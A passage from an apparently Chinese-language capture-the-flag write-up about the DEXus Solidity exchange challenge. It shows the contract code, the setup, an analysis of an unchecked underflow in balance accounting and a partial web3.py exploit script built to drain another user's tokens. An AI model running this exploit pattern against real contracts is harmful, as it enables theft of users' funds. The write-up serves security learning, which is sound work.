punctuation">]</span><span class="token punctuation">;</span>            <span class="token builtin">uint</span> amount_ <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>amount<span class="token punctuation">,</span> remainingAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token builtin">uint</span> sellerPrice <span class="token operator">=</span> <span class="token punctuation">(</span>amount_ <span class="token operator">*</span> o<span class="token punctuation">.</span>price<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">**</span> p<span class="token punctuation">.</span>price_decimals<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">_countBalance</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> amount_<span class="token punctuation">,</span> <span class="token string">"Insufficient unlocked balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            remainingAmount <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>            overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> sellerPrice<span class="token punctuation">;</span>            overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>                        overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>creator<span class="token punctuation">]</span> <span class="token operator">-=</span> sellerPrice<span class="token punctuation">;</span>            lockedBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>creator<span class="token punctuation">]</span> <span class="token operator">-=</span> sellerPrice<span class="token punctuation">;</span>            overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>creator<span class="token punctuation">]</span> <span class="token operator">+=</span> amount_<span class="token punctuation">;</span>            <span class="token keyword">emit</span> <span class="token function">OrderCompleted</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>id<span class="token punctuation">,</span> pair_name<span class="token punctuation">,</span> o<span class="token punctuation">.</span>creator<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount_<span class="token punctuation">,</span> o<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>o<span class="token punctuation">.</span>amount <span class="token operator">&gt;</span> amount_<span class="token punctuation">)</span> <span class="token punctuation">{</span>                o<span class="token punctuation">.</span>amount <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">delete</span> AllOrders<span class="token punctuation">[</span>o<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>            orderList<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ordersLength<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>remainingAmount <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">emit</span> <span class="token function">MarketOrderRemainder</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> remainingAmount<span class="token punctuation">,</span> OrderType<span class="token punctuation">.</span>SELL<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">sellOrderLimit</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">,</span> <span class="token builtin">uint</span> price<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token function">pairExists</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">{</span>        Pair <span class="token keyword">storage</span> p <span class="token operator">=</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">_countBalance</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">,</span> <span class="token string">"Insufficient unlocked balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lockedBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        last_order_id<span class="token operator">++</span><span class="token punctuation">;</span>        Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">storage</span> orderList <span class="token operator">=</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>SELL<span class="token punctuation">]</span><span class="token punctuation">;</span>        Order <span class="token keyword">memory</span> new_order <span class="token operator">=</span> <span class="token function">Order</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            id<span class="token punctuation">:</span> last_order_id<span class="token punctuation">,</span>            pair_name<span class="token punctuation">:</span> pair_name<span class="token punctuation">,</span>            amount<span class="token punctuation">:</span> amount<span class="token punctuation">,</span>            price<span class="token punctuation">:</span> price<span class="token punctuation">,</span>            creator<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span>            orderType<span class="token punctuation">:</span> OrderType<span class="token punctuation">.</span>SELL        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orderList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>new_order<span class="token punctuation">)</span><span class="token punctuation">;</span>        AllOrders<span class="token punctuation">[</span>last_order_id<span class="token punctuation">]</span> <span class="token operator">=</span> new_order<span class="token punctuation">;</span>        <span class="token comment">// gas optimization</span>        unchecked <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> orderList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>price <span class="token operator">&lt;</span> orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token comment">// swap orders</span>                Order <span class="token keyword">memory</span> tmp <span class="token operator">=</span> orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">emit</span> <span class="token function">NewSellOrder</span><span class="token punctuation">(</span>last_order_id<span class="token punctuation">,</span> pair_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">deleteOrder</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        Order <span class="token keyword">storage</span> o <span class="token operator">=</span> AllOrders<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>creator <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token string">"You'are not the order creator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">storage</span> orders <span class="token operator">=</span> PairOrders<span class="token punctuation">[</span>o<span class="token punctuation">.</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>orderType<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// gas optimization</span>        unchecked <span class="token punctuation">{</span>            <span class="token builtin">uint</span> i<span class="token punctuation">;</span>            <span class="token builtin">bool</span> found<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> orders<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>orders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> o<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    found <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>found<span class="token punctuation">)</span> <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token string">"Corrupt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> orders<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                Order <span class="token keyword">storage</span> tmp <span class="token operator">=</span> orders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                orders<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> orders<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                orders<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            orders<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">delete</span> AllOrders<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// internal</span>    <span class="token keyword">function</span> <span class="token function">_countBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> user<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// gas optimization</span>        unchecked <span class="token punctuation">{</span>            <span class="token keyword">return</span> overallBalances<span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">-</span> lockedBalances<span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后给出了挑战内容，大致是这样的：</p><ol><li>合约给了User 100K UHTK，10 DAI，给了你 10 UHTK，10 DAI</li><li>User在DEX中创建了两个订单，分别是卖出 100K UHTK，和卖出 2 DAI。</li><li>你需要偷走User的100K UHTK</li></ol><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">/</span>setup<span class="token punctuation">.</span>sol<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.13</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./DEXus.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./mocks/ERC20Mock.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Setup</span> <span class="token punctuation">{</span>    DEXus <span class="token keyword">public</span> immutable TARGET<span class="token punctuation">;</span>    ERC20Mock <span class="token keyword">public</span> uhtk<span class="token punctuation">;</span>    ERC20Mock <span class="token keyword">public</span> dai<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> user<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> hacker<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> USER_UHTK_BALANCE <span class="token operator">=</span> <span class="token number">100000</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> USER_DAI_BALANCE <span class="token operator">=</span> <span class="token number">10</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> HACKER_UHTK_BALANCE <span class="token operator">=</span> <span class="token number">10</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> HACKER_DAI_BALANCE <span class="token operator">=</span> <span class="token number">10</span> ether<span class="token punctuation">;</span>        <span class="token builtin">bool</span> inited <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>        TARGET <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DEXus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uhtk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ERC20Mock</span><span class="token punctuation">(</span><span class="token string">"Unhackable Token"</span><span class="token punctuation">,</span> <span class="token string">"UHTK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ERC20Mock</span><span class="token punctuation">(</span><span class="token string">"DAI Stablecoin"</span><span class="token punctuation">,</span> <span class="token string">"MTK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">prefund</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>inited<span class="token punctuation">,</span> <span class="token string">"Already funded!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hacker <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span> user <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uhtk<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> USER_UHTK_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        uhtk<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span>hacker<span class="token punctuation">,</span> HACKER_UHTK_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        dai<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> USER_DAI_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        dai<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span>hacker<span class="token punctuation">,</span> HACKER_DAI_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        DEXus dex <span class="token operator">=</span> <span class="token function">DEXus</span><span class="token punctuation">(</span>TARGET<span class="token punctuation">)</span><span class="token punctuation">;</span>        dex<span class="token punctuation">.</span><span class="token function">addPair</span><span class="token punctuation">(</span><span class="token string">"UHTKDAI"</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>uhtk<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>dai<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dex<span class="token punctuation">.</span><span class="token function">addPair</span><span class="token punctuation">(</span><span class="token string">"DAIUHTK"</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>dai<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>uhtk<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uhtk<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>dex<span class="token punctuation">)</span><span class="token punctuation">,</span> USER_UHTK_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        dex<span class="token punctuation">.</span><span class="token function">deposit</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>uhtk<span class="token punctuation">)</span><span class="token punctuation">,</span> USER_UHTK_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        dai<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>dex<span class="token punctuation">)</span><span class="token punctuation">,</span> USER_DAI_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        dex<span class="token punctuation">.</span><span class="token function">deposit</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>dai<span class="token punctuation">)</span><span class="token punctuation">,</span> USER_DAI_BALANCE<span class="token punctuation">)</span><span class="token punctuation">;</span>        dex<span class="token punctuation">.</span><span class="token function">sellOrderLimit</span><span class="token punctuation">(</span><span class="token string">"UHTKDAI"</span><span class="token punctuation">,</span> USER_UHTK_BALANCE<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dex<span class="token punctuation">.</span><span class="token function">sellOrderLimit</span><span class="token punctuation">(</span><span class="token string">"DAIUHTK"</span><span class="token punctuation">,</span> <span class="token number">2</span> ether<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        inited <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> uhtk<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> <span class="token operator">==</span> USER_UHTK_BALANCE<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>乍一看合约内容非常复杂，但是期中大多数内容我们都不需要去读懂。按图索骥，既然我们需要获得大量的UHTK，只需要找出DEX中转账的函数，分析他们的漏洞。</p><p>只有<code>withdraw</code>函数中存在转账功能，但是通过正常的买卖手段我们显然是不能获得到那么多的UHTK的。所以我们需要找出其他的漏洞。</p><p>我们发现，在转账之前，首先检查了<strong>unlockedToken</strong>，这个数值等于<code>deposit</code>进入的数值，减去由于进行sell操作而lock的Token。</p><p>但是，这里这里在进行计算的具体过程中使用了<code>unchecked</code>关键字，这个关键字的作用是取消了<strong>overflow</strong>和<strong>underflow</strong>的检查，也就是说，虽然高于0.8.0的编译器版本已经加入了溢出检查，但这种情况下，即使我们的数值溢出了，也不会报错。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">_countBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> user<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// gas optimization</span>    unchecked <span class="token punctuation">{</span>        <span class="token keyword">return</span> overallBalances<span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">-</span> lockedBalances<span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路已经很明了，只需要让<code>lockedBalances</code>，大于<code>overallBalances</code>，就可以在withdraw的时候，转出大量的Token。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们发现，在<code>buyOrderMarket</code>函数中，只检测了<code>_countBalance</code>是否大于购买的amount数值，而实际应该检测是否大于<code>buyprice</code>的值。</p><p>首先我们通过sell操作，令<code>overallBalances</code>略大于<code>lockedBalances</code>，然后通过buy操作，令<code>lockedBalances</code>大于<code>overallBalances</code>，这样就可以在withdraw的时候，转出大量的Token。</p><p>由于buyprice是amount的2.5倍，我们选择sell 7 ethers UHTK，然后buy 2 ethers DAI，正好可以造成下溢的情况。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>deposit<span class="token punctuation">(</span>DAI_addr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> accout<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">8000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span>pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>tx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>deposit<span class="token punctuation">(</span>uhtk_addr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> accout<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">8000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span>pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>tx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>sellOrderLimit<span class="token punctuation">(</span><span class="token string">"UHTKDAI"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> accout<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">8000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token 